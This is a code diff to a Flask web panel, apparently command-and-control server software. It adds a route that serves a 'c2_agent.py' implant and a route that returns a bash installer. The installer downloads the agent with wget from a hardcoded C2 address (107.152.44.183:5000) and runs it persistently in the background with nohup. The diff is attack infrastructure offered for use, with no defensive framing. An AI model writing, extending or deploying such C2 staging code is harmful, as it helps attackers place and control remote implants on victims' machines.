@@ -169,6 +169,54 @@ def handle_alert(data):
     emit('new_alert', data, broadcast=True)
 
 # ============================================
+# DOWNLOAD AGENT
+# ============================================
+
+@app.route('/agent/c2_agent.py')
+def download_agent():
+    """Download c2_agent.py"""
+    agent_path = '/root/c2-panel/agent/c2_agent.py'
+    if os.path.exists(agent_path):
+        with open(agent_path, 'r') as f:
+            content = f.read()
+        return content, 200, {'Content-Type': 'text/plain'}
+    else:
+        # Alternative: serve from /tmp
+        agent_path2 = '/tmp/c2_agent.py'
+        if os.path.exists(agent_path2):
+            with open(agent_path2, 'r') as f:
+                content = f.read()
+            return content, 200, {'Content-Type': 'text/plain'}
+        return "Agent file not found", 404
+
+@app.route('/agent/install.sh')
+def download_installer():
+    """Download installer script"""
+    script = '''#!/bin/bash
+# C2 Agent Installer
+C2_SERVER="http://107.152.44.183:5000"
+AGENT_DIR="/opt/c2_agent"
+
+mkdir -p $AGENT_DIR
+cd $AGENT_DIR
+
+# Download agent
+wget $C2_SERVER/agent/c2_agent.py -O c2_agent.py
+chmod +x c2_agent.py
+
+# Install dependencies
+pip3 install requests
+
+# Run agent
+nohup python3 c2_agent.py > /var/log/c2_agent.log 2>&1 &
+
+echo "[+] Agent installed and running"
+echo "[+] Check: ps aux | grep c2_agent"
+echo "[+] Log: tail -f /var/log/c2_agent.log"
+'''
+    return script, 200, {'Content-Type': 'text/plain'}
+
+# ============================================
 # MAIN
 # ============================================
 
